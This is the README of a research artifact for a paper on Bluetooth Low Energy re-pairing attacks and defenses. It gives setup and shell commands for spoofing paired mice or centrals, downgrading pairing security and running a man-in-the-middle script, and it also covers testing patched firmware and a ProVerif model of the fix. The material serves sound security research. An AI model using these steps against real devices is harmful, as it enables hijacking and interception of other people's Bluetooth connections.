# BLE Re-Pairing Attacks PoC

This repository contains the attacks PoCs as described in the paper [BLERP: BLE Re-Pairing Attacks and Defenses](TODO) published at NDSS 26'.

The artifact is also available at [doi.org/10.5281/zenodo.17671927](https://doi.org/10.5281/zenodo.17671927)

## Requirements

**Hardware:**

  * 2 Nordic nRF52840-DK (PCA10056)

**Software:**

  * [Segger JLink](https://www.segger.com/downloads/jlink/)
  * [Apache newt v1.9.0](https://mynewt.apache.org/latest/newt/install/newt_linux.html)
  * Python 3.12.0 (MitM attack only)
  * A serial device tool (e.g., [tio](https://github.com/tio/tio))

## Toolkit Setup

1. Setup the workspace

```bash
git clone github.com/sacca97/blerp.git
cd blerp
./setup.sh
cd blerp_poc
./apply_attacks_patches.sh
```

2. Connect the board via USB and install the OS and _bleshell_ app (`ceid` is the actual S/N of the board)

```bash
make boot-10056 devid=0123456789 && make central ceid=0123456789
```

3. Connect to the board using the serial tool, in our case

```bash
tio /dev/serial/by-id/usb-SEGGER_J-Link_000123456789-if00
```

Once connected, pressing Tab will show the list of available commands.


## Testing Peripheral Impersonation

This attack maps to Section IV.B of the paper. The user must pair the target Peripheral with a Central device (e.g., a mouse with a laptop or smartphone). Here we assume a mouse with a random BLE address.

The mouse must be paired with the Android device and turned off (or out of range) during the test. Then the user starts by setting the mouse Bluetooth address in the toolkit with:

1. Configure the board to spoof the Peripheral, send a fake _authreq_ value, have the lowest security settings, and reject one encrption request

```sh
# Address type can be random or public
spoof-address addr=MAC_Address addr_type=random

# Appearance=962 refers specifically to mice
spoof-advertise-data name="MX Master 3" appearance=962

# Request maximum security
spoof-authreq mitm=1 bond=1 sc=1 keypress=1

# Actually support lowest security
security-set-data mitm=0 sc=0 keysize=7

# Reject one encryption request only
blerp-reject-enc val=1
```

2. Start advertising and wait for the victim Central to connect. Once it happens, the attack starts automatically.

```bash
# Must be the same address type of spoof-address
advertise own_addr_type=random
```

If the victim disconnect after the encryption request rejection, the device is not vulnerable.

## Testing Central Impersonation

This attack maps to Section IV.C of the paper. The user is required to pair the target Peripheral with a Central device, as in the Peripheral Impersonation, with the only difference that, in this case, the Central must be turned off (or brought out of range).

Devices are configured as in the Peripheral Impersonation attack. The attack starts when a connection is initiated

```sh
# Centrals usually have public addresses
spoof-address addr=MAC_Address addr_type=public

# Actually support lowest security
security-set-data mitm=0 sc=0 keysize=7

# Peripherals usually have random addresses
connect addr=MAC_Address addr_type=random
```

## Double-channel MitM

This attack maps to the double-channel MitM attack described in Section IV.D of the paper. Similar to the previous attacks, the two victim devices must be paired. Once this is done, connect the two nRF52s to your machine and:

1. Connect the two board to your machine and perform a clean install

```bash
# Run twice, once per board
make erase devid=0123456789 && make boot-10056 devid=0123456789

# Run once, specify the boards S/N
make hci-mitm ceid=0123456789 peid=9876543210
```

2.  Modify `python-host/mitm.py` and replace the variables in the main block with the ones of the victim devices

```python
CENTRAL_ADDR = "XX:XX:XX:XX:XX:XX"

CENTRAL_ADDR_TYPE = 0 # 0 for public, 1 for random

PERIPHERAL_NAME = "Peripheral Name"
```

3. Launch the MitM script (requires root)

```bash
sudo .venv/bin/python python-host/mitm.py
```

Now disconnect the two legitimate devices by turning off Bluetooth on the Central. Once this is done, the attack will proceed as follows:

1.  The malicious Peripheral copies the advertisement data from the legitimate Peripheral.
2.  The malicious Central connects to the legitimate Peripheral, blocking its advertising.
3.  The malicious Peripheral begins advertising using the spoofed data.
4.  Manually turn the legitimate Central's Bluetooth on. 👤
5.  The legitimate Central connects to the malicious Peripheral, starting the attack. The legitimate Central may be prompted with a Yes/No dialog box to confirm the connection.

## Testing Hardened Re-pairing

To test the hardened re-pairing, install the patched firmware on one of the nRF52 and use the other one as the attacker. 


```bash
./apply_fixes_patch.sh
make erase devid=0123456789
make central ceid=0123456789
``` 

The tests follow the same steps outlined previously for the attacks, including the securtiy level downgrade.


## Testing Authenticated Re-pairing

The authenticated re-pairing protocol can be verified using ProVerif. For download and installation please refer to the [official website](https://bblanche.gitlabpages.inria.fr/proverif/). Once installed, run:

```sh
proverif formal/blerp_fixes.pv
```

The model contains two queries, one to verify integrity and authentication of the re-pairing and another one to perform a sanity check to show that the protocol ends correctly. The ProVerif verification summary should reflect the one below:

```sh
# Injective correspondence
Query inj-event(end_B(k)) ==> inj-event(end_A(k)) is true.

# Sanity check
Query not (event(end_A(k)) && event(end_B(k))) is false.
```
